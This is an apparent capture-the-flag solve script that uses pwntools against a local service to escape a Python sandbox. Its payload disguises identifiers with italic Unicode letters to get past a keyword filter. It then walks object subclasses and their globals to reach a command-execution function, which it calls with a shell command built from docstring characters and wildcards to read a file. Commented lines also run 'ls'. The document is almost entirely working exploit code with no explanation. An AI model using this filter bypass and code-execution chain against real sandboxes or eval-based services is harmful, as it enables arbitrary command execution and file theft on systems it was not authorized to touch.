from pwn import *

def solve():
    p = remote("localhost", 4004)
    # my computer
    payload = """[*[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][6].𝘷𝘢𝘭𝘶𝘦𝘴()][42]([*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[140].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥())"""
    # remote
    payload = """[*[*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[-7 ].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][6].𝘷𝘢𝘭𝘶𝘦𝘴()][42]([*().__𝘤𝘭𝘢𝘴𝘴__.__𝘣𝘢𝘴𝘦__.__𝘴𝘶𝘣𝘤𝘭𝘢𝘴𝘴𝘦𝘴__()[-7].__𝘪𝘯𝘪𝘵__.__𝘨𝘭𝘰𝘣𝘢𝘭𝘴__.𝘷𝘢𝘭𝘶𝘦𝘴()][-5]("{} ./????.???".𝘧𝘰𝘳𝘮𝘢𝘵(().__𝘥𝘰𝘤__[-3] + ().__𝘥𝘰𝘤__[-11] + ().__𝘥𝘰𝘤__[-2])).𝘳𝘦𝘢𝘥())"""
    p.sendline(payload)
    p.interactive()
    p.close()
solve()


# print([*[*().__class__.__base__.__subclasses__()[-7].__init__.__globals__.values()][6].values()][42]([*().__class__.__base__.__subclasses__()[-7].__init__.__globals__.values()][-5]("{} ./????.???".format(().__doc__[-3] + ().__doc__[-11] + ().__doc__[-2])).read()))


# print("{} ./????.???".format(().__doc__[-3] + ().__doc__[-11] + ().__doc__[-2]))

# print([*().__class__.__base__.__subclasses__()[-7].__init__.__globals__.values()][-5])


# print([*().__class__.__base__.__subclasses__()[-7].__init__.__globals__.values()][-5]("{} ./????.???".format(().__doc__[-3] + ().__doc__[-11] + ().__doc__[-2])).read())

# print([*().__class__.__base__.__subclasses__()[-7].__init__.__globals__.values()][-5]("ls").read())